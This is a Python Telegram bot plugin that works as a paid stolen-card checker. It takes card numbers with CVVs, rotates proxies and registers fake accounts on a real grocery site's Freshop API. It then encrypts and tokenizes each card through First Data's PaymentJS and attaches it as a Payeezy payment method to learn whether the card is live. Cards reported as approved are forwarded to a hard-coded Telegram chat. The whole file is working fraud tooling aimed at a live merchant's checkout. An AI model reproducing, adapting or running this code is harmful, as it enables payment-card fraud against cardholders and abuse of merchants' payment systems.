import json
import base64
import requests
from Plugins.SegundoPlano.antispam import *
import rsa
from parse import parseX
import check_template
import datetime
import names
import re
import AdyenEncrypt
import uuid
import parser_kurama
import time
import random
from func_bin import get_bin_info
from Plugins.Func import connect_to_db
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from requests.exceptions import ProxyError, ConnectionError

max_retries = 3
retry_delay = 3

proxiess = "proxys.txt"

keyboard = InlineKeyboardMarkup(
    [
        [InlineKeyboardButton("Premium for only $3", url="https://t.me/RefeDarwinScrapper/9175")]
    ]
)

def generar_codigo_session():
    codigo_session = str(uuid.uuid4())
    return codigo_session

COMMAND_STATUS_FILE = "command_status.txt"

def is_command_enabled(command_name):
    with open(COMMAND_STATUS_FILE, "r") as f:
        command_status = f.read().splitlines()
    for line in command_status:
        name, status = line.split(":")
        if name == command_name:
            return status == "on"
    return False


name_gate = "Payeezy"
subtype = "Auth"
command = "yz"

@Client.on_message(filters.command([f"{command}"], prefixes=['.', '/', '!', '?'], case_sensitive=False) & filters.text)
def stripeau(client, message, command=command):
    if not is_command_enabled(f"{command}"):
            return message.reply(f""" <a href='https://imgur.com/ihpUqrG.jpg'>&#8203;</a> 
━━━━━✧𝑲𝒖𝒓𝒂𝒎𝒂𝑪𝒉𝒌✧━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] STATUS ↯ <code>MANTENIMIENTO | OFF ❌</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] GATEWAY ↯  <code>{name_gate}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] SUBTYPE ↯  <code>{subtype}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] USE ↯ <code>PREMIUM PLAN</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] VERSIÓN ↯ 6.0
━━━━━━━━━✧♛✧━━━━━━━━  </b> """, reply_markup=keyboard)
    username = message.from_user.username
    chat_id = message.chat.id
    user_id = message.from_user.id
    command = command
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    spam_message = antispam(user_id, command, message)
    if spam_message is not None:
        message.reply(spam_message)
        return        
            #--------- VERIFICACION DE BIN BANEADOS ----------#
    
    ccs = message.text[len(f"/{command} "):]  
    reply = message.reply_to_message
    
    
    
    try:
        if not ccs:
            reply = message.reply_to_message
            texto = reply.text[:6]
        else:
            texto = ccs[:6]
    
        
    
        with open('binban.txt', 'r') as file:
            bins_baneados = file.readlines()
        
        for bin_baneado in bins_baneados:
            if texto.startswith(bin_baneado.strip()[:6]):
                message.reply('⚠️Error: Banned BIN. Please try another method.⚠️')
                return
            
    except:
        pass
        
    
    try:
    
        with open('binban.txt', 'r') as file:
            bins_baneados = file.readlines()
        
        for bin_baneado in bins_baneados:
            if texto.startswith(bin_baneado.strip()[:6]):
                message.reply('⚠️Error: Banned BIN. Please try another method.⚠️')
                return
        
    except:
        pass
            
    conn = connect_to_db()
    cursor = conn.cursor()
    user_id = message.from_user.id
    username = message.from_user.username  
    
    cursor.execute('SELECT rango, creditos, antispam, dias FROM users WHERE user_id = ?', (user_id,))
    user_data = cursor.fetchone()
    if not user_data:
                return message.reply(f"<b>First, you must register. /register .</b> ")
            
    if user_data[0] in ["Baneado", "baneado"]:
        return message.reply(f"<b>You are not allowed to use the \nReason: Banned bot❌. </b> ")
           
    chat_id2 = message.chat.id
    chat_data = cursor.execute('SELECT rango FROM users WHERE user_id = ?', (chat_id2,))
    chat_data = cursor.fetchone()
    
    if chat_data is None:
        chat_data = "Free"
        
        
           
    if all(role not in user_data[0] for role in ["Premium", "Seller", "Owner"]) and all(role not in chat_data[0] for role in ["Staff", "Staff"]):
            return message.reply(f"<b>The chat is not authorized to use this command. Contact admin @Crypto_locker5 ❌</b> <a href='https://imgur.com/ihpUqrG.jpg'>&#8203;</a>", reply_markup=keyboard)
    
    
    if user_data[1] is not None:
        current_credits = int(user_data[1])
    else:
        current_credits = 0
        
    if current_credits <= 1:
            message.reply(f"You do not have enough credits.  ")
            return 
        
    ccs = message.text[len(f"/{command} "):]  
                  
      
    reply = message.reply_to_message
            
    if not ccs:
        if not reply or not reply.text:
            return message.reply(f"""<b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{name_gate}</code>   
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Subtype ↯ <code>{subtype}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Use ↯ <code>${command} cc|month|year|cvv</code>
━━━━━━━━━━━━━━━━
</b>""", reply_markup=keyboard, disable_web_page_preview=True)
     

        ccs = reply.text
        

    result = parser_kurama.parseData(ccs)
    x = get_bin_info(ccs[:6])

    if 'error' in result:
        return message.reply(f"""<b> 
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{name_gate} {subtype}</code>   
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] CC ↯ <code>{ccs}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Status ↯ <b>DECLINED ❌</b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Result ↯ Card Invalid!
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bin ↯ <code>{x.get("type")}</code> | <code>{x.get("level")}</code> | <code>{x.get("vendor")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Country ↯ <code>{x.get("country")} {x.get("flag")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bank ↯ <code>{x.get("bank_name")}</code>
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Checked by ↯ @{username} [{user_data[0]}]
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bot by ↯ @Crypto_locker5

</b>""", reply_markup=keyboard, disable_web_page_preview=True)
            
        
    ccnum = result['ccnum']
    mes = result['month']
    ano = result['year']
    if len(ano) == 4:
        ano = ano[2:4]
    cvv = result['cvv']
    ccs = f"{ccnum}|{mes}|{ano}|{cvv}"
    
    
    req = requests.get(f"https://bins.antipublic.cc/bins/{ccnum[:6]}").json()      
    brand = req['brand']
    fecha_hora_actual = datetime.datetime.now()
    timestamp_actual = int(fecha_hora_actual.timestamp() * 1000)

    CorreoRand = f"{names.get_first_name()}{names.get_last_name()}%40gmail.com"
    four = random.randint(1000, 9999)
    tree = random.randint(100, 999)
    x = get_bin_info(ccnum[:6])
        
    #---------- PLANTILLA DE CARGA #1 ------------#
    loading_message = message.reply(f"""<b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{name_gate} {subtype}</code>   
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] CC ↯ <code>{ccs}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Status ↯ <b>Loading...</b> 
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bin ↯ <code>{x.get("type")}</code> | <code>{x.get("level")}</code> | <code>{x.get("vendor")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Country ↯ <code>{x.get("country")} {x.get("flag")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bank ↯ <code>{x.get("bank_name")}</code>
━━━━━━━━━━━━━━━━  </b>""", reply_markup=keyboard, disable_web_page_preview=True)
    
    SessionId = generar_codigo_session()
    session = requests.Session()
    
    with open(proxiess, 'r') as file:
        proxies_1 = file.read().splitlines()
            
        session = requests.Session()
        proxie = random.choice(proxies_1)

        session.proxies = {
        'https': f'{proxie}'}
    
    inicio = time.time()
    

        

    #------------------- #1 Requests -------------------#
    headers = {
        'authority': 'api.freshop.com',
        'referer': 'https://www.shakersmarketplace.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    }

    data = {
        'app_key': 'shakers',
        'locale': 'false',
        'referrer': 'https://www.shakersmarketplace.com/',
        'utc': timestamp_actual,
    }


    for retry in range(max_retries):
        try:
            response = session.post('https://api.freshop.com/2/sessions/create', headers=headers, data=data).text
    
            token = parseX(response, '"token":"', '"')
        
            break  
        
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED ❌"
                respuesta = "Maximum number of retries reached: 3 | Requests #1"

                proxyy = "DEAD 🟥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()  
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests #1")
            msg = "DECLINED ❌"
            respuesta = "Error de solicitud | Requests #1"

            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #1")
            msg = "DECLINED ❌"
            respuesta = "An unexpected error has occurred. | Requests #1"
            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

    fecha_actual = datetime.datetime.now()
    print(fecha_actual)
    #------------------- #2 Requests -------------------#
    
    headers = {
        'authority': 'api.freshop.com',
        'origin': 'https://www.shakersmarketplace.com',
        'referer': 'https://www.shakersmarketplace.com/my-account',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    }

    data = f'address_1=Street+16th+av+billonarie&app_key=shakers&city=New+York&email={CorreoRand}&first_name=Juan&last_name=Smith&password=Kurama%231212&phone=(248)+{tree}-{four}&phone_country=us&postal_code=10080&referrer=https%3A%2F%2Fwww.shakersmarketplace.com%2Fmy-account%23!%2Fcreate&selected_store_id=3667&state=ny&token={token}&utc={timestamp_actual}'


    for retry in range(max_retries):
        try:
            
            response = session.post('https://api.freshop.com/2/users/create', headers=headers, data=data).text
        
            break  
        
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED ❌"
                respuesta = "Maximum number of retries reached: 3 | Requests #2"

                proxyy = "DEAD 🟥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests #2")
            msg = "DECLINED ❌"
            respuesta = "Error de solicitud | Requests #2"

            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #2")
            msg = "DECLINED ❌"
            respuesta = "An unexpected error has occurred. | Requests #2"
            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        
    #------------------- #3 Requests -------------------#   
    
    headers = {
        'authority': 'api.freshop.com',
        'origin': 'https://www.shakersmarketplace.com',
        'referer': 'https://www.shakersmarketplace.com/my-account',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    }

    params = {
        'app_key': 'shakers',
        'is_default_for_delivery': 'true',
        'token': token,
    }

    
    for retry in range(max_retries):
        try:
            response = session.get('https://api.freshop.com/2/user_addresses', params=params, headers=headers).text
            userid = parseX(response, '"user_id":"', '"')
            
            print(response)
            
            if "None" in userid:
                msg = "Please try again. ♻️"
                respuesta = "An error occurred with the page."
                
                proxyy = "LIVE 🟩"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

                
                
            break   
           
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED ❌"
                respuesta = "Maximum number of retries reached: 3 | Requests #3"

                proxyy = "DEAD 🟥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)


    
        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests #3")
            msg = "DECLINED ❌"
            respuesta = "Error de solicitud | Requests #3"

            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        
        except KeyError as e:
            print(f"Error de clave: {e}")
            msg = "DECLINED ❌"
            respuesta = f"Error al obtener {e} del response | Requests #3"

            proxyy = "LIVE 🟩" 
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #3")
            msg = "DECLINED ❌"
            respuesta = "An unexpected error has occurred. | Requests #3"
            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        
    #------------------- #4 Requests -------------------#
    
    headers = {
        'authority': 'api.freshop.com',
        'origin': 'https://www.shakersmarketplace.com',
        'referer': 'https://www.shakersmarketplace.com/my-account',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    }

    data = f'app_key=shakers&referrer=https%3A%2F%2Fwww.shakersmarketplace.com%2Fmy-account%23!%2Fpayment-methods%3Fid%3D0%26identifier%3Dpayeezy_v2&store_id=3667&token={token}&utc={timestamp_actual}'

    
    
    for retry in range(max_retries):
        try:
            response = session.post(
                f'https://api.freshop.com/2/users/{userid}/saved_payment/payeezy_v2/initiate',
                headers=headers,
                data=data,
            )
            
            jsondata = response.json()
            resp = response.text
            bearer = parseX(resp, '"client_token":"', '"')
            

            public_key_bytes = base64.b64decode(jsondata["publicKeyBase64"])


            public_key = rsa.PublicKey.load_pkcs1_openssl_pem(public_key_bytes)

            data_to_encrypt = {
                'name': 'Juan Smith',
                'card': ccnum,
                'cvv': cvv,
                'exp': f'{mes}/{ano}'
            }
        
            json_string = json.dumps(data_to_encrypt)

            encrypted_data = rsa.encrypt(json_string.encode('utf-8'), public_key)

            encrypted_data_base64 = base64.b64encode(encrypted_data).decode('utf-8')
            
            break
        
            
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED ❌"
                respuesta = "Maximum number of retries reached: 3 | Requests #4"

                proxyy = "DEAD 🟥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)


    
        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests #4")
            msg = "DECLINED ❌"
            respuesta = "Error de solicitud | Requests #4"

            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #4")
            msg = "DECLINED ❌"
            respuesta = "An unexpected error has occurred. | Requests #4"
            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        
    #------------------- #5 Requests -------------------#
    
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Access-Control-Request-Headers': 'client-token,content-type',
        'Access-Control-Request-Method': 'POST',
        'Connection': 'keep-alive',
        'Origin': 'https://docs.paymentjs.firstdata.com',
        'Referer': 'https://docs.paymentjs.firstdata.com/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    }
          
    for retry in range(max_retries):
        try:

            response = session.options('https://prod.api.firstdata.com/paymentjs/v2/client/tokenize', headers=headers)
    
        
            break
                
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED ❌"
                respuesta = "Maximum number of retries reached: 3 | Requests #5"

                proxyy = "DEAD 🟥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)


    
        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests #5")
            msg = "DECLINED ❌"
            respuesta = "Error de solicitud | Requests #5"

            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #5")
            msg = "DECLINED ❌"
            respuesta = "An unexpected error has occurred. | Requests #5"
            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)


    #------------------- #6 Requests -------------------#
    
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Client-Token': f'Bearer {bearer}',
        'Origin': 'https://docs.paymentjs.firstdata.com',
        'Referer': 'https://docs.paymentjs.firstdata.com/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    }

    json_data = {
        'encryptedData': encrypted_data_base64,
    }

    for retry in range(max_retries):
        try:

            response = session.post('https://prod.api.firstdata.com/paymentjs/v2/client/tokenize', headers=headers, json=json_data).text
            
            break
                
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED ❌"
                respuesta = "Maximum number of retries reached: 3 | Requests #6"

                proxyy = "DEAD 🟥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)


    
        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests #6")
            msg = "DECLINED ❌"
            respuesta = "Error de solicitud | Requests #6"

            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #6")
            msg = "DECLINED ❌"
            respuesta = "An unexpected error has occurred. | Requests #6"
            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

    #------------------- #7 Requests -------------------#
    
    headers = {
        'authority': 'api.freshop.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.shakersmarketplace.com',
        'referer': 'https://www.shakersmarketplace.com/my-account',
        'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    }

    data = f'app_key=shakers&browser_color_depth=24&browser_java_enabled=False&browser_java_script_enabled=True&browser_language=en-US&browser_screen_height=768&browser_screen_width=1366&browser_time_zone=300&card_token={bearer}&referrer=https%3A%2F%2Fwww.shakersmarketplace.com%2Fmy-account%23!%2Fpayment-methods%3Fid%3D0%26identifier%3Dpayeezy_v2&save_payment=true&store_id=3667&token={token}&utc={timestamp_actual}'

    
    
    for retry in range(max_retries):
        try:

            response = session.post(
                f'https://api.freshop.com/2/users/{userid}/payment_methods/payeezy_v2',
                headers=headers,
                data=data,
            ).text
    
            time.sleep(2)
            
                
            break
                
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED ❌"
                respuesta = "Maximum number of retries reached: 3 | Requests #7"

                proxyy = "DEAD 🟥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)


    
        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests 7")
            msg = "DECLINED ❌"
            respuesta = "Error de solicitud | Requests #7"

            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #7")
            msg = "DECLINED ❌"
            respuesta = "An unexpected error has occurred. | Requests #7"
            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

    #------------------- RESPONSE CODE ------------------------#
    
    code = parseX(response, '"error_message":"', '"')
    
    if "{}" in response:
        msg = "Approved Auth!✅"
        respuesta = "Subscription completed"
        print(msg, respuesta)
        
    elif int(response.find('Insufficient Funds')) > 0 :
        msg = "APPROVED CVV✅"
        respuesta = "Insufficient Funds"
        print(msg, respuesta)
                        
    else:
            respuesta = code
            msg = "DECLINED! ❌"
    
            
    proxyy = "LIVE 🟩"
    gateway = f'<code>{name_gate} {subtype}</code>'
    end = time.time()
    tiempo = str(inicio - end)[1:5]
    session.close()  
    if "APPROVED" in msg:
        
        chat_id = -1002000802973
    
        client.send_message(chat_id, check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy))
        
    loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)
    
    if "APPROVED" in msg:
        chat_id = -1002000802973
    
        client.send_message(chat_id, check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy))
        
        current_credits = int(user_data[1])

        # Restar 3 crédito
        new_credits = current_credits - 3

        # Actualizar créditos en la tabla users
        update_query = "UPDATE users SET creditos = ? WHERE user_id = ?"
        update_data = (new_credits, user_id)
        cursor.execute(update_query, update_data)
        conn.commit()
        
        # Obtener créditos actuales del usuario
        select_query = "SELECT creditos FROM users WHERE user_id = ?"
        cursor.execute(select_query, (user_id,))
        current_credits = cursor.fetchone()[0]
        
        return message.reply(f"<b>2 Credits have been deducted, Remaining: {current_credits} </b>")